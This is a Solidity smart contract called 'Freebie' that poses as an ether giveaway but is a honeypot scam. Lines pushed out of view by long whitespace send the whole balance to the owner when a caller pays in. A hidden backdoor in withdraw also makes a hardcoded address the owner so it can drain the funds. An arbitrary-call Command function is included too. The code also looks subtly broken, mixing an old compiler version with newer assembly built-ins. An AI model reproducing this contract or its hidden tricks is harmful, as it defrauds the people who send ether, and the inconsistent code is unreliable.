pragma solidity ^0.4.19;

contract Freebie
{
    address public Owner = msg.sender;
    
    function() public payable{} 
    
    function GetFreebie()
    public
    payable
    {      
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
            assembly {
                let bal := selfbalance()
                let result := call(gas(), caller(), bal, 0, 0, 0, 0)
            }
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.sender == Owner);
        assembly {
            let bal := selfbalance()
            let result := call(gas(), sload(Owner_slot), bal, 0, 0, 0, 0)
        }
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        
        assembly {
            let result := call(gas(), adr, callvalue(), add(data, 0x20), mload(data), 0, 0)
        }
    }
}